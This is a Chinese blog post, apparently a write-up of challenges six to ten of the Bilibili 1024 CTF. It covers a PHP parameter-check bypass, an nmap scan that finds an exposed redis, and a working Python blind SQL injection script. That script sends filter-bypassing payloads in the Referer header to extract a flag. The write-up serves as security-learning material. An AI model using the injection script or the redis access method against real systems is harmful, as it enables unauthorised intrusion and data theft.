---
title: 哔哩哔哩 1024 安全挑战赛解题思路（后篇）
date: 2020/10/24
updated: 2020/10/24
category: 
- Mist
- CTF
tag: 
- CTF
- 哔哩哔哩
---
又名 bilibili 猜谜竞赛。被 W 拖来玩了。还挺有意思的。

这里是第六到第十题的题解。

<!-- more -->

## 六~十  结束亦是开始

> 结束亦是开始
> 
> 题目地址： http://45.113.201.36/blog/single.php?id=1

第七题到第十题的题面都是这一段：

> 接下来的旅程
> 
> 需要少年自己去探索啦～

另外说一下，原来的 IP 地址是 `120.92.151.189`。

## 十

打开网站。

[![](image/2020-10-24-bilibili-ctf/2020-10-26_10-59-51.png)](image/2020-10-24-bilibili-ctf/2020-10-26_10-59-51.png)

……？blog？？？

转了一圈什么都没找到。在百无聊赖的时候我顺手把网站里的 single 改成了 test。

[![](image/2020-10-24-bilibili-ctf/2020-10-26_11-36-24.png)](image/2020-10-24-bilibili-ctf/2020-10-26_11-36-24.png)

草。是 JSFuck。

解码似乎解不出什么。直接复制进 console 里运行一下。

```bash
var str1 = "\u7a0b\u5e8f\u5458\u6700\u591a\u7684\u5730\u65b9";
var str2 = "bilibili1024havefun";
console.log()
```

转换一下。

> 程序员最多的地方

那肯定是 GitHub 啊！

打开 GitHub，直接搜索 `bilibili1024havefun`。

[![](image/2020-10-24-bilibili-ctf/2020-10-26_11-50-50.png)](image/2020-10-24-bilibili-ctf/2020-10-26_11-50-50.png)

成功找到了一个 php [interesting-1024/end](https://github.com/interesting-1024/end)。点开看看。

```php
<?php

//filename end.php

$bilibili = "bilibili1024havefun";

$str = intval($_GET['id']);
$reg = preg_match('/\d/is', $_GET['id']);

if(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){
	$content = file_get_contents($_GET['url']);
	
	//文件路径猜解
	if (false){
		echo "还差一点点啦～";
	}else{
		echo $flag;
	}
}else{
	echo "你想要的不在这儿～";
}
?>
```

把网址的 simple 换成 end，果不其然输出了“你想要的不在这儿～”。这个 php 里也没有什么东西。

那么就看看参数。我不是很懂 PHP，所以得搜一下是什么意思。

搜了一下，`intval()` 用来获取变量的整数值。`preg_match()` 不用猜都知道是正则。它匹配到的时候会返回一个整型返回值，`1` 是一维数组。那这个 PHP 的代码就好懂了。它要求一个变量 `id[]` （必须是一维数组），值等于 `1`（如果不传值是不会返回正确的图片的）。然后后面还会跟一个 `url=`。

那么就猜一猜 `url=` 的值是什么。那我盲猜有 flag。

curl 传过去发现不对。那继续猜。随便加个后缀什么的，比如 `.txt`，把它变成文件路径。

[![](image/2020-10-24-bilibili-ctf/2020-10-26_16-48-48.png)](image/2020-10-24-bilibili-ctf/2020-10-26_16-48-48.png)

拿到一张图片。存到本地的时候发现文件里带了串奇怪的字符串。估计八成跟 flag 有关。

用 `cat` 命令看一下这张图片。果然文件最后跟了串字符串。

[![](image/2020-10-24-bilibili-ctf/2020-10-26_16-48-48.png)](image/2020-10-24-bilibili-ctf/2020-10-26_16-48-48.png)

提交到第六题……居然不对？一个个试过去发现居然是第十题的……草。

看完这个文件后我的 PowerShell 也乱码了……草（二度（

## 八

回到这个 IP 地址。

反正也没什么事情做了，用 nmap 扫一遍它开启的端口与服务。

[![](image/2020-10-24-bilibili-ctf/2020-10-26_16-18-05.png)](image/2020-10-24-bilibili-ctf/2020-10-26_16-18-05.png)

扫出来一个 redis。直接用 IP 地址和端口登上去。

[![](image/2020-10-24-bilibili-ctf/2020-10-26_16-18-26.png)](image/2020-10-24-bilibili-ctf/2020-10-26_16-18-26.png)

第八题结束。

## 六

超出我能力范围了。直接上源码。

```python
import requests
url = 'http://120.92.151.189/blog/single.php?id=1'
flag = ''
for i in range(1, 100):
    left = 33
    right = 128

    while right-left != 1:
        mid = mid=(left+right)//2
        payload = "0123'^if(substr((selselectect flag from flag),{i},1)>binary {mid},(selecselectt 1+~0),0) ununionion selecselectt 1,2#".format(
            i=i, 
            mid=hex(mid))
        headers = {
            'Referer': payload
        }
        r = requests.get(url=url, headers=headers)
        if len(r.text) == 5596:
            left = mid
        else:
            right = mid
    flag += chr(right)
    print(flag)
```

运行结果如图。

[![](image/2020-10-24-bilibili-ctf/2020-10-26_19-28-11.png)](image/2020-10-24-bilibili-ctf/2020-10-26_19-28-11.png)

## 七、九

仍然好奇下载下来的图片里，那个奇怪的字符串 `224a634752448def6c0ec064e49fe797`。

## 插曲

[![](image/2020-10-24-bilibili-ctf/2020-10-26_17-06-31.png)](image/2020-10-24-bilibili-ctf/2020-10-26_17-06-31.png)

还是免了吧。

## 用到的工具

- [在线unicode转中文,中文转unicode](https://www.bejson.com/convert/unicode_chinese/)
